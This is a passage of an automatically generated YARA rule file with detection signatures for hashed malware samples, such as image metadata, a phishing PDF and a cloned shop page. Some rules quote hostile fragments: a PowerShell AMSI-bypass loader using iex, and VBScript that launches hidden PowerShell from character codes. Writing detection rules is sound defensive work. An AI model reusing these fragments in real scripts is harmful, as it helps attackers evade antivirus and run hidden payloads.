      $s12 = "5IODJssIen9KNgYPdUMP0zmR1FxVcxmxwN/yQQp3DmStNQ/r2c6QdLHsA6Kg/nsYf/nGpKPx0WTLkcuT0/Ir2pSX6KyqIkLmxeZW4LqTjPtwQeCV+OaBDbPAuaZ65gxs" ascii /* score: '21.00'*/
      $s13 = "59qPqnSXUgSvG1hwZiZcvbTI3BmLgDHqgs3hHlrLfVVcu8YLnHNd2EJNn+DOJtaUMBO8/gEtQG7NoEtZRNPGzZxpRpPXPfz2NqX23bdllCkoyV0SZAOieFLj1P9wjfDL" ascii /* score: '21.00'*/
      $s14 = "9YNSFkKcdDq5w9o678FMx/vYBmS25yIzH5mibYFpgdy36o/bk+xj15sVy3xabmimlIWhOXNXfTPOy2u+42DQXbWDFQhYOLPjk6glE6NttyBnnZkIZ8znTRZNJZJcZeaK" ascii /* score: '20.00'*/
      $s15 = "5RWdnUMS56dlLmr3GHkoEvBCKKbXJgW0koyiYUE038BPbZj3ITp/mM+7itBGjjkh/lQWkWAjz09EscWwVD9/F/k6OyCwXVZdsXAj8F28IrYYeLvhrZXdTFMNS5HuvDYH" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule ba30de7e2f6efe3a9482fe3c09dc9dbab5c6ffc1c7255d05c0aef6fc4c8f57db_ba30de7e {
   meta:
      description = "_subset_batch - file ba30de7e2f6efe3a9482fe3c09dc9dbab5c6ffc1c7255d05c0aef6fc4c8f57db_ba30de7e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ba30de7e2f6efe3a9482fe3c09dc9dbab5c6ffc1c7255d05c0aef6fc4c8f57db"
   strings:
      $s1 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s2 = "-form-url#coded/" fullword ascii /* score: '9.00'*/
      $s3 = "ftpdgdm[H" fullword ascii /* score: '9.00'*/
      $s4 = "livetimeo" fullword ascii /* score: '8.00'*/
      $s5 = "5]GZi+%s%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule c54bf2afe6429e153a360896cb0fbfe9d0a342d3843deea400774ce013645efb_c54bf2af {
   meta:
      description = "_subset_batch - file c54bf2afe6429e153a360896cb0fbfe9d0a342d3843deea400774ce013645efb_c54bf2af.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c54bf2afe6429e153a360896cb0fbfe9d0a342d3843deea400774ce013645efb"
   strings:
      $s1 = "-form-url#coded/" fullword ascii /* score: '9.00'*/
      $s2 = "-]GZi#%s%" fullword ascii /* score: '8.00'*/
      $s3 = "ACSc+ +0-#'IQ;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule dc006b0e6d1afe132934ef79f357d129dde21315290b7540fbf10039f85b8829_dc006b0e {
   meta:
      description = "_subset_batch - file dc006b0e6d1afe132934ef79f357d129dde21315290b7540fbf10039f85b8829_dc006b0e.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc006b0e6d1afe132934ef79f357d129dde21315290b7540fbf10039f85b8829"
   strings:
      $s1 = "<!-- logininf -->" fullword ascii /* score: '28.00'*/
      $s2 = "<form name=\"quick_find_header\" action=\"https://www.kiplingbagsgreece.gr/index.php?main_page=advanced_search_result\" method=" ascii /* score: '23.00'*/
      $s3 = "<div id=\"L5LkQf1SeJ\"><a href=\"https://www.kiplingbagsgreece.gr/\"><img title=\"\" src=\"includes/templates/kiplingbagsgreece/" ascii /* score: '22.00'*/
      $s4 = "<!-- content -->" fullword ascii /* score: '22.00'*/
      $s5 = "</div><!-- content -->" fullword ascii /* score: '22.00'*/
      $s6 = "<div id=\"hptFkxgswR\"><a href=\"https://www.kiplingbagsgreece.gr/\"><img title=\"\" src=\"includes/templates/kiplingbagsgreece/" ascii /* score: '22.00'*/
      $s7 = "<!-- eof breadcrumb -->" fullword ascii /* score: '20.00'*/
      $s8 = "<script type=\"text/javascript\" src=\"//www.kiplingbagsgreece.gr/includes/templates/kiplingbagsgreece/jscript/jscript_1.11.1.mi" ascii /* score: '20.00'*/
      $s9 = "<script type=\"text/javascript\" src=\"//www.kiplingbagsgreece.gr/includes/templates/kiplingbagsgreece/jscript/jscript_1.11.1.mi" ascii /* score: '20.00'*/
      $s10 = "<!-- bof  breadcrumb -->" fullword ascii /* score: '20.00'*/
      $s11 = "<!-- bof upload alerts -->" fullword ascii /* score: '19.00'*/
      $s12 = "<!-- eof upload alerts -->" fullword ascii /* score: '19.00'*/
      $s13 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"//www.kiplingbagsgreece.gr/includes/templates/kiplingbagsgreece/css/stylesheet" ascii /* score: '19.00'*/
      $s14 = "<!--bof-header logo and navigation display-->" fullword ascii /* score: '19.00'*/
      $s15 = "</a></li></ul></li><li><a href=\"https://www.kiplingbagsgreece.gr/login.html\">" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 80KB and
      8 of them
}

rule c0980e1429c5c1a19e3ec18c4b33cde3b1498b04a66c50d695e1e1817891a346_c0980e14 {
   meta:
      description = "_subset_batch - file c0980e1429c5c1a19e3ec18c4b33cde3b1498b04a66c50d695e1e1817891a346_c0980e14.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c0980e1429c5c1a19e3ec18c4b33cde3b1498b04a66c50d695e1e1817891a346"
   strings:
      $s1 = "Xeno-v1.2.60/WebView2Loader.dll" fullword ascii /* score: '29.00'*/
      $s2 = "Xeno-v1.2.60/api-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s3 = "Xeno-v1.2.60/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s4 = "Xeno-v1.2.60/vcruntime140_1.dll" fullword ascii /* score: '23.00'*/
      $s5 = "Xeno-v1.2.60/vcruntime140.dll" fullword ascii /* score: '23.00'*/
      $s6 = "Xeno-v1.2.60/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s7 = "Xeno-v1.2.60/api-ms-win-crt-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "Xeno-v1.2.60/libssl-3-x64.dll" fullword ascii /* score: '20.00'*/
      $s9 = "Xeno-v1.2.60/Microsoft.Web.WebView2.Wpf.dll" fullword ascii /* score: '20.00'*/
      $s10 = "Xeno-v1.2.60/api-ms-win-crt-stdio-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "Xeno-v1.2.60/XenoUI.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Xeno-v1.2.60/Xeno.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Xeno-v1.2.60/Microsoft.Web.WebView2.WinForms.dll" fullword ascii /* score: '20.00'*/
      $s14 = "Xeno-v1.2.60/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "Xeno-v1.2.60/msvcrt.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 19000KB and
      8 of them
}

rule dbae532e4ceca95aa1577f97ccf00df19d597e1ed33d4e022d32551731739a42_dbae532e {
   meta:
      description = "_subset_batch - file dbae532e4ceca95aa1577f97ccf00df19d597e1ed33d4e022d32551731739a42_dbae532e.pdf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dbae532e4ceca95aa1577f97ccf00df19d597e1ed33d4e022d32551731739a42"
   strings:
      $s1 = "<</S/URI/Type/Action/URI(https://raineger-my.sharepoint.com/:w:/g/personal/kanzlei_eger-ra_de/EcqHNnuLE_ZCqpDQKPbTcgMB7UG_74dU9o" ascii /* score: '20.00'*/
      $s2 = "<</S/URI/Type/Action/URI(https://raineger-my.sharepoint.com/:w:/g/personal/kanzlei_eger-ra_de/EcqHNnuLE_ZCqpDQKPbTcgMB7UG_74dU9o" ascii /* score: '20.00'*/
      $s3 = "<</S/URI/Type/Action/URI(http://www.google.com)>>" fullword ascii /* score: '17.00'*/
      $s4 = "            xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"" fullword ascii /* score: '12.00'*/
      $s5 = "            xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\"" fullword ascii /* score: '12.00'*/
      $s6 = "            xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\">" fullword ascii /* score: '12.00'*/
      $s7 = "<</DecodeParms<</Columns 5/Predictor 12>>/Filter/FlateDecode/ID[<E414D75D056D43219E57896C68A174F1><668EBF0719FF12419EF805E913BD1" ascii /* score: '11.00'*/
      $s8 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<E414D75D056D43219E57896C68A174F1><C8382A5FF212FB4E8292760936082" ascii /* score: '11.00'*/
      $s9 = "<</Differences[24/breve/caron/circumflex/dotaccent/hungarumlaut/ogonek/ring/tilde 39/quotesingle 96/grave 128/bullet/dagger/dagg" ascii /* score: '10.00'*/
      $s10 = "<</BitsPerComponent 8/ColorSpace/DeviceRGB/Filter/DCTDecode/Height 70/Length 1710/Subtype/Image/Type/XObject/Width 204>>stream" fullword ascii /* score: '9.00'*/
      $s11 = "<</BitsPerComponent 8/ColorSpace/DeviceRGB/Filter/DCTDecode/Height 289/Length 3348/Subtype/Image/Type/XObject/Width 208>>stream" fullword ascii /* score: '9.00'*/
      $s12 = "ieresis/eth/ntilde/ograve/oacute/ocircumflex/otilde/odieresis/divide/oslash/ugrave/uacute/ucircumflex/udieresis/yacute/thorn/ydi" ascii /* score: '9.00'*/
      $s13 = "ls/agrave/aacute/acircumflex/atilde/adieresis/aring/ae/ccedilla/egrave/eacute/ecircumflex/edieresis/igrave/iacute/icircumflex/id" ascii /* score: '9.00'*/
      $s14 = "/Eth/Ntilde/Ograve/Oacute/Ocircumflex/Otilde/Odieresis/multiply/Oslash/Ugrave/Uacute/Ucircumflex/Udieresis/Yacute/Thorn/germandb" ascii /* score: '9.00'*/
      $s15 = "<</BitsPerComponent 8/ColorSpace/DeviceRGB/Filter[/FlateDecode/DCTDecode]/Height 1755/Length 13225/Subtype/Image/Type/XObject/Wi" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5025 and filesize < 2000KB and
      8 of them
}

rule d4c9253c51a26f91ea25b1edd3190e327a1ecfa4f8dbe2a218be0121d0328678_d4c9253c {
   meta:
      description = "_subset_batch - file d4c9253c51a26f91ea25b1edd3190e327a1ecfa4f8dbe2a218be0121d0328678_d4c9253c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d4c9253c51a26f91ea25b1edd3190e327a1ecfa4f8dbe2a218be0121d0328678"
   strings:
      $s1 = "yuiaswe" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule ba5e904f239e748a39ba6607d76b8862dc128b81dd8c033a85cfbedf12bafd8b_ba5e904f {
   meta:
      description = "_subset_batch - file ba5e904f239e748a39ba6607d76b8862dc128b81dd8c033a85cfbedf12bafd8b_ba5e904f.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ba5e904f239e748a39ba6607d76b8862dc128b81dd8c033a85cfbedf12bafd8b"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "Evt:instanceID=\"xmp.iid:83fc5870-9366-a547-a5da-592a4c204e94\" stEvt:when=\"2019-04-09T11:19:03+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s6 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s7 = "019-04-09T11:19:03+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule c4db421aabf828780d79fbf623f4867f99aa29a375f534af137e54d903396feb_c4db421a {
   meta:
      description = "_subset_batch - file c4db421aabf828780d79fbf623f4867f99aa29a375f534af137e54d903396feb_c4db421a.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c4db421aabf828780d79fbf623f4867f99aa29a375f534af137e54d903396feb"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:8a82777f-7a89-f74b-9ed9-a0e32b6f452a\" stEvt:when=\"2019-04-09T10:50:20+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:20+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule c5c39e179a110b8eb80c842a5d2c76cb41cd1c2af22a29be5b5fc916b726b6ec_c5c39e17 {
   meta:
      description = "_subset_batch - file c5c39e179a110b8eb80c842a5d2c76cb41cd1c2af22a29be5b5fc916b726b6ec_c5c39e17.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c5c39e179a110b8eb80c842a5d2c76cb41cd1c2af22a29be5b5fc916b726b6ec"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:71f4df4c-4092-934a-9978-c0e097864e20\" stEvt:when=\"2019-04-09T10:50:25+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:25+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s8 = "7)%I%:Ji" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule c62a051be756c594a32601cc83a36456122c8af00800e5522dbc9e08ed67bcf6_c62a051b {
   meta:
      description = "_subset_batch - file c62a051be756c594a32601cc83a36456122c8af00800e5522dbc9e08ed67bcf6_c62a051b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c62a051be756c594a32601cc83a36456122c8af00800e5522dbc9e08ed67bcf6"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "//ns.adobe.com/xap/1.0/\" xmlns:aux=\"http://ns.adobe.com/exif/1.0/aux/\" xmlns:exifEX=\"http://cipa.jp/exif/1.0/\" xmlns:photos" ascii /* score: '17.00'*/
      $s3 = "yhttp://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s4 = "http://ns.adobe.com/photoshop/1.0/\" xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/s" ascii /* score: '17.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmp=" ascii /* score: '11.00'*/
      $s6 = "/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmp:CreatorTool=\"7.1.2\" xmp:ModifyDate=\"2019-04-09T12:03:46+0" ascii /* score: '10.00'*/
      $s7 = "Evt:when=\"2019-04-09T12:03:46+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> </rdf:Seq> </x" ascii /* score: '9.00'*/
      $s8 = "eID=\"xmp.iid:48b0c016-98de-4b4f-8fca-74b05b79ab72\" stEvt:when=\"2019-04-09T12:03:46+03:00\" stEvt:softwareAgent=\"Adobe Photos" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule c653d7f20ffe475679379b3fa16d772c25ac4c4737ff0631ffcfb7a60bb2f34d_c653d7f2 {
   meta:
      description = "_subset_batch - file c653d7f20ffe475679379b3fa16d772c25ac4c4737ff0631ffcfb7a60bb2f34d_c653d7f2.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c653d7f20ffe475679379b3fa16d772c25ac4c4737ff0631ffcfb7a60bb2f34d"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s5 = "Webp.net-compress-image" fullword wide /* score: '13.00'*/
      $s6 = "Evt:instanceID=\"xmp.iid:c5fb21b0-3911-9c4b-a55e-9373b2cb6e9c\" stEvt:when=\"2019-04-09T11:20:39+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s7 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s8 = "019-04-09T11:20:39+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s9 = "$%JTANa%2" fullword ascii /* score: '8.00'*/
      $s10 = ")2%I%#w" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 4000KB and
      all of them
}

rule ce977c0d005c23ec8eac4ed8a5bdf608a4925416a99b1745ce7f8cd3c371f4a0_ce977c0d {
   meta:
      description = "_subset_batch - file ce977c0d005c23ec8eac4ed8a5bdf608a4925416a99b1745ce7f8cd3c371f4a0_ce977c0d.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce977c0d005c23ec8eac4ed8a5bdf608a4925416a99b1745ce7f8cd3c371f4a0"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:bc2945df-e1ec-c148-a333-d69d310ebbbe\" stEvt:when=\"2019-04-09T10:50:17+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:17+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule dda50e2e9346c16d5a07575239bf3a685f8d1f89e82b251ded68c792c8fe9737_dda50e2e {
   meta:
      description = "_subset_batch - file dda50e2e9346c16d5a07575239bf3a685f8d1f89e82b251ded68c792c8fe9737_dda50e2e.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dda50e2e9346c16d5a07575239bf3a685f8d1f89e82b251ded68c792c8fe9737"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "Evt:instanceID=\"xmp.iid:07b67c2c-a63a-0d4d-98d6-a71fc265e046\" stEvt:when=\"2019-04-09T11:19:06+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s6 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s7 = "019-04-09T11:19:06+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 800KB and
      all of them
}

rule de03ce21fb8cb556404c54a06e7e32db6f3e4e27201eb4697c8372ac048ab209_de03ce21 {
   meta:
      description = "_subset_batch - file de03ce21fb8cb556404c54a06e7e32db6f3e4e27201eb4697c8372ac048ab209_de03ce21.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "de03ce21fb8cb556404c54a06e7e32db6f3e4e27201eb4697c8372ac048ab209"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "Evt:instanceID=\"xmp.iid:ebc8f3a6-7460-454a-b9bd-6a6d9552fa9f\" stEvt:when=\"2019-04-09T11:18:56+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s6 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s7 = "019-04-09T11:18:56+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule bb182b8545b8c825811c6d09c738c230fe54bc96adf1f10a3683b7e5294b5289_bb182b85 {
   meta:
      description = "_subset_batch - file bb182b8545b8c825811c6d09c738c230fe54bc96adf1f10a3683b7e5294b5289_bb182b85.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bb182b8545b8c825811c6d09c738c230fe54bc96adf1f10a3683b7e5294b5289"
   strings:
      $s1 = "[Byte[]]$V_rr1 = (Get-Content \"C:\\ProgramData\\pe.txt\").Split(',') | foreach-Object {\"$([double]($_/10))\"}" fullword ascii /* score: '27.00'*/
      $s2 = "[Byte[]]$V_rr = (Get-Content \"C:\\ProgramData\\1.txt\").Split(',') | foreach-Object {\"$([double]($_/10))\"}" fullword ascii /* score: '27.00'*/
      $s3 = "$asm::Load([byte[]]($V_rr1)).GetType('AmsiAnti' + 'Malware' + 'Provider' + '.BypassIt').GetMethod('Exe' + 'cute').Invoke($null, " ascii /* score: '20.00'*/
      $s4 = "$asm::Load([byte[]]($V_rr1)).GetType('AmsiAnti' + 'Malware' + 'Provider' + '.BypassIt').GetMethod('Exe' + 'cute').Invoke($null, " ascii /* score: '20.00'*/
      $s5 = "'$asm::' + 'Load($V_rr)' + '.EntryPoint' + '.Invoke($null, $null)' | iex" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 1KB and
      all of them
}

rule bb24e3114e1bc8935985ae26946d5f28129c0c20aacde41a5cb4d301f53968db_bb24e311 {
   meta:
      description = "_subset_batch - file bb24e3114e1bc8935985ae26946d5f28129c0c20aacde41a5cb4d301f53968db_bb24e311.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bb24e3114e1bc8935985ae26946d5f28129c0c20aacde41a5cb4d301f53968db"
   strings:
      $x1 = "shell.Run \"powershell -Command \"\"$a = @(112,111,119,101,114,115,104,101,108,108,32,45,78,111,80,32,45,87,32,72,105,100,100,10" ascii /* score: '31.00'*/
      $x2 = "shell.Run \"powershell -Command \"\"$a = @(112,111,119,101,114,115,104,101,108,108,32,45,78,111,80,32,45,87,32,72,105,100,100,10" ascii /* score: '31.00'*/
      $s3 = "Set shell = CreateObject(\"WScript.Shell\")" fullword ascii /* score: '15.00'*/
      $s4 = "Dim shell" fullword ascii /* score: '9.00'*/
      $s5 = "8,65,71,56,65,98,81,66,116,65,71,69,65,98,103,66,107,65,65,61,61); iex (-join ($a | % {[char]$_}))\"\"\", 0, False" fullword ascii /* score: '8.00'*/
   condition:
